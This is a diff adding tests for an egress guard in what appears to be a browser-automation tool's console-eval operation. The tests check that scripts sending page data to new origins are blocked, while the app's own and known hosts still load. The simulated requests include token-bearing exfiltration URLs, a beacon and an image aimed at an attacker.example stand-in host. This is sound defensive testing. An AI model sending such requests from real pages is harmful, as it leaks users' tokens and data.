@@ -60,3 +60,51 @@ test("password guard fails closed: a page too big to look through, or one that t
   const broken = { querySelectorAll: () => { throw new Error("boom"); } };
   assert.equal(run(broken), true);
 });
+
+// ---- B1: a guarded script cannot send the page's data to a fresh origin (reviewer-2)
+const pause = (/** @type {any} */ k, /** @type {string} */ id, /** @type {string} */ url, type = "Fetch") => k.push(3, "Fetch.requestPaused", { requestId: id, request: { url, method: "GET" }, resourceType: type });
+const wait = (ms = 20) => new Promise(r => setTimeout(r, ms));
+
+function egressRig(/** @type {any} */ script) {
+  const k = makeCtx({ active: 3 });
+  k.respond["Runtime.evaluate"] = async (/** @type {any} */ p) => {
+    const e = String(p.expression || "");
+    if (e === passwordFieldScript) return { result: { value: false } };
+    if (e.includes("performance.getEntriesByType")) return { result: { value: ["https://services.example.com/v1/contacts", "https://app.example.com/dashboard"] } };
+    if (e.includes("vyre-test-script")) { await script(k); await wait(); return { result: { type: "string", value: "done" } }; }
+    return { result: { value: [] } };
+  };
+  return k;
+}
+
+test("egress guard: a fetch to a fresh origin carrying localStorage is failed and reported held; the app's own API and its known hosts still work", async () => {
+  const k = egressRig(async (/** @type {any} */ kk) => {
+    pause(kk, "own", "https://app.example.com/api/me");
+    pause(kk, "known", "https://services.example.com/v1/contacts?limit=5");
+    pause(kk, "evil", "https://attacker.example/c?d=%7B%22token%22%3A%22abc%22%7D");
+    pause(kk, "beacon", "https://collect.attacker.example/b", "Ping");
+    pause(kk, "img", "https://img.attacker.example/p.gif", "Image");
+    pause(kk, "data", "data:image/gif;base64,R0lGOD");
+  });
+  const r = await dt.ops["dev.console.eval"]({ tab: 3, expression: "/*vyre-test-script*/ 1" }, k.ctx);
+  assert.equal(r.held, true, JSON.stringify(r));
+  assert.match(r.why, /attacker\.example/);
+  assert.ok(!JSON.stringify(r).includes("token"), "the query never comes back");
+  const failed = k.calls("Fetch.failRequest").map((/** @type {any} */ c) => c.params.requestId).sort();
+  const cont = k.calls("Fetch.continueRequest").map((/** @type {any} */ c) => c.params.requestId).sort();
+  assert.deepEqual(failed, ["beacon", "evil", "img"]);
+  assert.deepEqual(cont, ["data", "known", "own"]);
+  assert.ok(k.calls("Fetch.enable").length >= 1);
+  assert.ok(k.calls("Fetch.disable").length >= 1, "Fetch is switched off again when the script ends");
+});
+
+test("egress guard: asked lifts it, and a script that reaches only known origins returns its value", async () => {
+  const k = egressRig(async (/** @type {any} */ kk) => { pause(kk, "evil", "https://attacker.example/c"); });
+  const r = await dt.ops["dev.console.eval"]({ tab: 3, expression: "/*vyre-test-script*/ 1", asked: true }, k.ctx);
+  assert.equal(r.held, undefined);
+  assert.equal(k.calls("Fetch.enable").length, 0, "no guard when the person asked");
+  const k2 = egressRig(async (/** @type {any} */ kk) => { pause(kk, "own", "https://app.example.com/api/me"); });
+  const r2 = await dt.ops["dev.console.eval"]({ tab: 3, expression: "/*vyre-test-script*/ 1" }, k2.ctx);
+  assert.equal(r2.ok, true);
+  assert.equal(r2.value, "done");
+});
